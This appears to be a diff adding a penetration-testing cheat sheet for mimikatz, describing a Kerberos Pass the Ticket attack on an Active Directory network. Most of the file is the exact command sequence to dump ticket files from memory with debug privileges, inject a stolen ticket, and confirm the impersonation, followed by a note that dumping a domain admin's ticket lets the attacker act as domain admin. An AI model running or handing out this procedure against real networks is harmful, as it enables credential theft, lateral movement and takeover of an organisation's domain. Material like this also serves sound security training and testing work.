@@ -1,0 +1,34 @@
+mimikatz - post-exploitation tool most commonly used for dumping user credentials 
+inside of an active directory network
+Source: https://github.com/ParrotSec/mimikatz
+
+##################### Pass the Ticket #####################
+Dump Tickets:
+  mimikatz.exe   (run the command prompt as an administrator)
+  privilege::debug
+  sekurlsa::tickets /export
+
+Pass the Ticket:
+  kerberos::ptt <ticket>
+                 Cache and impersonate the given ticket
+  klist          Verify successfully impersonated ticket by listing cached tickets
+                 You now have impersonated the ticket giving you the same rights 
+                 as the TGT you're impersonating
+
+Commands:
+  mimikatz.exe   Run mimikatz
+  privilege::debug
+                 Ensure this outputs [output '20' OK] if it does not that means you do not
+                 have the administrator privileges to properly run mimikatz
+  sekurlsa::tickets /export
+                 Export all of the .kirbi tickets into the directory that you are currently in
+
+
+Informational:
+  Pass the Ticket attack is used for privilege escalation and lateral movement
+  if there are unsecured domain service account tickets laying around.
+  The attack allows you to escalate to domain admin if you dump a domain admin's
+  ticket and then impersonate that ticket using mimikatz PTT attack allowing you 
+  to act as that domain admin.
+
+##################### Pass the Ticket #####################
